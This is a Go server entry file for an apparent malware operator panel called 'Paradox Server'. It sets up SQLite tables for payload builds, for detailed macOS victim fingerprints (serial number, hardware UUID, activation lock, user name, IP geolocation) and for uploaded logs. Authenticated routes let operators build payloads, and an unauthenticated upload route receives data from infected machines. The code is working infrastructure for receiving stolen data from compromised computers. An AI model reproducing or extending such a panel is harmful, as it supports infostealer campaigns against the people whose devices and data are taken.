package main

import (
	"database/sql"
	"fmt"
	"log"
	"net/http"
	"os"
	"paradox_server/handlers"
	"paradox_server/routes"
	"paradox_server/static"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
	_ "github.com/mattn/go-sqlite3"
)

var db *sql.DB

func initDB() error {
	var err error
	db, err = sql.Open("sqlite3", static.DBFile)
	if err != nil {
		return fmt.Errorf("failed to open database: %w", err)
	}

	createUsersTableSQL := `CREATE TABLE IF NOT EXISTS users (
		"id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
		"username" TEXT UNIQUE NOT NULL,
		"password_hash" TEXT NOT NULL,
		"created_at" DATETIME DEFAULT CURRENT_TIMESTAMP,
		"last_login" DATETIME
	);`

	_, err = db.Exec(createUsersTableSQL)
	if err != nil {
		return fmt.Errorf("failed to create users table: %w", err)
	}

	createTableSQL := `CREATE TABLE IF NOT EXISTS payloads (
        "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
        "build_id" TEXT UNIQUE,
        "filename" TEXT,
        "user_id" INTEGER NOT NULL,
        "timestamp" DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY(user_id) REFERENCES users(id)
    );`

	_, err = db.Exec(createTableSQL)
	if err != nil {
		return fmt.Errorf("failed to create payloads table: %w", err)
	}

	createSystemInfoTableSQL := `CREATE TABLE IF NOT EXISTS system_info_logs (
		"id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
		"build_id" TEXT,
		"activation_lock_status" TEXT,
		"boot_mode" TEXT,
		"boot_volume" TEXT,
		"chip" TEXT,
		"computer_name" TEXT,
		"hardware_uuid" TEXT,
		"kernel_version" TEXT,
		"memory" TEXT,
		"model_identifier" TEXT,
		"model_name" TEXT,
		"model_number" TEXT,
		"os_loader_version" TEXT,
		"provisioning_udid" TEXT,
		"secure_virtual_memory" TEXT,
		"serial_number_system" TEXT,
		"system_firmware_version" TEXT,
		"system_integrity_protection" TEXT,
		"system_version" TEXT,
		"time_since_boot" TEXT,
		"total_number_of_cores" TEXT,
		"user_name" TEXT,
		"system_os" TEXT,
		"ip_city_name" TEXT,
		"ip_continent" TEXT,
		"ip_continent_code" TEXT,
		"ip_country_code" TEXT,
		"ip_country_name" TEXT,
		"ip_currency_code" TEXT,
		"ip_currency_name" TEXT,
		"ip_address" TEXT,
		"ip_version" INTEGER,
		"ip_is_proxy" BOOLEAN,
		"ip_language" TEXT,
		"ip_latitude" REAL,
		"ip_longitude" REAL,
		"ip_region_name" TEXT,
		"ip_time_zone" TEXT,
		"ip_time_zones" TEXT,
		"ip_tlds" TEXT,
		"ip_zip_code" TEXT,
		"timestamp" DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY(build_id) REFERENCES payloads(build_id)
	);`

	_, err = db.Exec(createSystemInfoTableSQL)
	if err != nil {
		return fmt.Errorf("failed to create system_info_logs table: %w", err)
	}

	createLogLocationsTableSQL := `CREATE TABLE IF NOT EXISTS log_locations (
		"id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
		"build_id" TEXT,
		"upload_uuid" TEXT UNIQUE NOT NULL,
		"relative_log_path" TEXT,
		"timestamp" DATETIME DEFAULT CURRENT_TIMESTAMP,
		FOREIGN KEY(build_id) REFERENCES payloads(build_id)
	);`

	_, err = db.Exec(createLogLocationsTableSQL)
	if err != nil {
		return fmt.Errorf("failed to create log_locations table: %w", err)
	}

	log.Println("Database initialized successfully.")
	return nil
}

func main() {
	if err := initDB(); err != nil {
		log.Fatalf("Fatal: Failed to initialize database: %v\n", err)
	}
	defer db.Close()

	router := gin.Default()

	router.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"http://localhost:3000"},
		AllowMethods:     []string{"GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Accept", "Authorization"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
		MaxAge:           12 * time.Hour,
	}))

	router.GET("/", func(c *gin.Context) {
		c.String(http.StatusOK, "Paradox Server Running")
	})

	router.POST("/auth/register", func(c *gin.Context) {
		handlers.Register(c, db)
	})

	router.POST("/auth/login", func(c *gin.Context) {
		handlers.Login(c, db)
	})

	protected := router.Group("/")
	protected.Use(handlers.AuthMiddleware())
	{
		routes.SetupBuildRoutes(protected, db)
		routes.SetupLogRoutes(protected, db)
	}

	public := router.Group("/")
	routes.SetupUploadRoutes(public, db)

	port := "8080"
	fmt.Printf("Starting server on port %s...\n", port)
	if err := router.Run(":" + port); err != nil {
		fmt.Printf("Fatal: Failed to start server: %v\n", err)
		os.Exit(1)
	}
}
